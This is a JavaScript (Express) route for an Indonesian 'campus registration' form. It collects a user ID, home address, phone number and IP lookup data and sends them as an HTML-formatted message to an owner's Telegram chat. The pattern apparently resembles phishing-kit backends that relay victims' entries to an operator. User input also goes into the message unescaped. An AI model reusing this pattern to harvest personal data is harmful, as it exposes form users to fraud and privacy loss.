app.post('/api/pendaftaran-kampus', async function(req, res) {
  const { userId, address, phoneNumber } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  if (!userId || !address || !phoneNumber) {
    return res.status(400).json({
      success: false,
      message: 'Semua field harus diisi (User ID, Alamat, No Telp)'
    });
  }

  try {
    const ipText = await getIpInfoText(ip);
    const sessionId = `REG-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

    const message = `
╔═══════════════════════╗
║  📋 PENDAFTARAN KAMPUS ║
╚═══════════════════════╝

📌 <b>DATA PENDAFTAR</b>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>${userId}</code>
🏠 <b>Alamat:</b> <code>${address}</code>
📱 <b>No Telp:</b> <code>${phoneNumber}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}

${ipText}

━━━━━━━━━━━━━━━━━━━━━
✅ Status: Form pendaftaran dikirim
    `;

    const sendStatus = await sendMessage(message, global.ownerChatId);

    if (sendStatus === 200) {
      log.box('success', {
        Proses: 'PENDAFTARAN KAMPUS',
        Route: '/api/pendaftaran-kampus',
        UserId: userId,
        PhoneNumber: phoneNumber,
        SessionId: sessionId,
        IP: ip,
      });

      return res.json({
        success: true,
        message: '✅ Data pendaftaran berhasil dikirim ke Telegram!',
        data: { userId, address, phoneNumber, sessionId }
      });
    }

    log.error('pendaftaran kampus error', 'Gagal mengirim pesan ke Telegram');
    return res.status(502).json({
      success: false,
      message: 'Pesan terkirim tapi gagal masuk Telegram (Retry limit)'
    });
  } catch (error) {
    log.error('pendaftaran kampus error', error.message);
    return res.status(502).json({
      success: false,
      message: 'Terjadi error saat mengirim pendaftaran ke Telegram'
    });
  }
});
